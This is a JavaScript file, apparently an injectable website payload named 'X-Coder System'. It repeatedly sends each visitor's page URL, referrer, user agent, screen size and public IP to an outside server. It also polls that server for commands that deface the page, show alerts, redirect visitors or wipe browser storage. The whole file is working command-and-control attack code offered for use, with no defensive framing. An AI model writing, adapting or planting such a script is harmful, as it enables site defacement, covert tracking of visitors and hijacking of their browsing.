    /**
 * X-Coder System v7.0 - PASTI WORK
 */

(function() {
    'use strict';

    // GANTI DENGAN URL INDEX.PHP ANDA!
    var SERVER = 'https://nexaisback.itsmeher.my.id/sec.php';

    function getDomain() {
        return window.location.hostname;
    }

    function sendData() {
        var data = {
            domain: getDomain(),
            url: window.location.href,
            path: window.location.pathname,
            title: document.title,
            referrer: document.referrer || 'Direct',
            userAgent: navigator.userAgent,
            screen: screen.width + 'x' + screen.height,
            timestamp: new Date().toISOString(),
            ip: ''
        };

        // Ambil IP
        try {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(r => { data.ip = r.ip; })
                .catch(function() {});
        } catch(e) {}

        // Kirim ke server
        try {
            fetch(SERVER, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(function() {});
        } catch(e) {}
    }

    function checkCommand() {
        try {
            var url = SERVER + '?cmd=get&domain=' + encodeURIComponent(getDomain());
            fetch(url)
                .then(r => r.json())
                .then(function(response) {
                    if (response && response.command) {
                        executeCommand(response.command, response);
                    }
                })
                .catch(function() {});
        } catch(e) {}
    }

    function executeCommand(command, data) {
        console.log('📡 Command:', command);
        
        switch(command) {
            case 'deface':
                document.documentElement.innerHTML = data.html || '<h1>HACKED BY NEXAHOST</h1>';
                break;
            case 'alert':
                alert(data.message || 'Alert!');
                break;
            case 'redirect':
                window.location.href = data.url || 'https://www.roblox.com/home';
                break;
            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                alert(data.message || 'Cleared!');
                break;
        }
    }

    // Kirim data pertama
    setTimeout(sendData, 1000);
    
    // Kirim data periodik (30 detik)
    setInterval(sendData, 30000);
    
    // Cek perintah (15 detik)
    setInterval(checkCommand, 15000);

    console.log('🔍 X-Coder started on:', getDomain());
})();
